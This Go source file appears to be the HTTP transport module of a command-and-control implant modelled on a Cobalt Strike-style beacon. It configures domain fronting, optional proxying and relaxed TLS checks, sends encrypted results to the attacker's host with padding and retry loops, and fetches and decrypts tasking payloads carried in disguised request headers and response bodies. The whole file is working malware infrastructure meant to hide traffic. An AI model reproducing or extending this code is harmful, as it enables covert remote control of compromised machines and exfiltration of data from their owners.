package packet

import (
	"bytes"
	"crypto/tls"
	"errors"
	"main/config"
	"main/util"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
)

// init was called at beginning of the package
func init() {
	httpRequest.SetTimeout(config.TimeOut * time.Second)
	if config.ProxyUrl != "" {
		err := httpRequest.SetProxyUrl(config.ProxyUrl)
		if err != nil {
			ErrorMessage(util.Sprintf("error proxy url: %s", config.ProxyUrl))
			os.Exit(1)
		}
	}
	if config.DomainFrontHost != "" {
		config.HttpHeaders["Host"] = config.DomainFrontHost
	}
	trans, _ := httpRequest.Client().Transport.(*http.Transport)
	trans.MaxIdleConns = 20
	trans.TLSHandshakeTimeout = config.TimeOut * time.Second
	trans.DisableKeepAlives = true
	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: config.VerifySSLCert}
}

// HttpPost seems post response is no need to deal with
// need to handler c2profile here
func HttpPost(data []byte) *req.Resp {
	data = util.EncryptField(config.PostClientDataEncryptType, data)
	// add custom header here
	headers := config.HttpHeaders

	param := req.QueryParam{
		config.PostClientID: string(util.EncryptField(config.PostClientIDEncrypt, []byte(strconv.Itoa(clientID)))),
	}

	// add append and prepend,but it seems client don't need this
	data = append(data, []byte(config.PostClientAppend)...)
	data = append([]byte(config.PostClientPrepend), data...)

	// push result may need to continually send packets until success
	for {
		url := config.Host + config.PostUri[rand.Intn(len(config.PostUri))]
		resp, err := httpRequest.Post(url, data, headers, param)
		if err != nil {
			util.Printf("!error: %v\n", err)
			time.Sleep(time.Second * time.Duration(config.WaitTime))
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				// it seems nobody care about post result?
				return resp
			}
			break
		}
	}

	return nil
}

// HttpGet need to handler c2profile here, data is raw rsa encrypted meta info
func HttpGet(data []byte) ([]byte, error) {
	// do some copy?
	buf := bytes.NewBuffer(data)
	stringData := string(util.EncryptField(config.GetMetaEncryptType, buf.Bytes()))
	stringData = config.GetClientPrepend + stringData + config.GetClientAppend

	httpHeaders := config.HttpHeaders
	metaDataHeader := req.Header{config.MetaDataField: stringData}

	url := config.Host + config.GetUri[rand.Intn(len(config.GetUri))]

	// provide 2 header args is supported
	resp, err := httpRequest.Get(url, httpHeaders, metaDataHeader)
	// if error occurred, just wait for next time
	if err != nil {
		return nil, err
	} else {
		if resp.Response().StatusCode == http.StatusOK {
			payload, err2 := resolveServerResponse(resp)
			if err2 != nil {
				return nil, err
			}
			return payload, nil
		} else {
			return nil, errors.New("http status is not 200")
		}
	}
}

// extract payload
func resolveServerResponse(res *req.Resp) ([]byte, error) {
	method := res.Request().Method
	// response body string
	data := res.Bytes()
	switch method {
	case "GET":
		data = bytes.TrimSuffix(bytes.TrimPrefix(data, []byte(config.GetServerPrepend)), []byte(config.GetServerAppend))
		var err error
		data, err = util.DecryptField(config.GetServerEncryptType, data)
		if err != nil {
			return nil, err
		}
	case "POST":
		data = bytes.TrimSuffix(bytes.TrimPrefix(data, []byte(config.PostServerPrepend)), []byte(config.PostServerAppend))
		var err error
		data, err = util.DecryptField(config.PostServerEncryptType, data)
		if err != nil {
			return nil, err
		}
	default:
		panic("invalid http method type " + method)
	}
	return data, nil
}
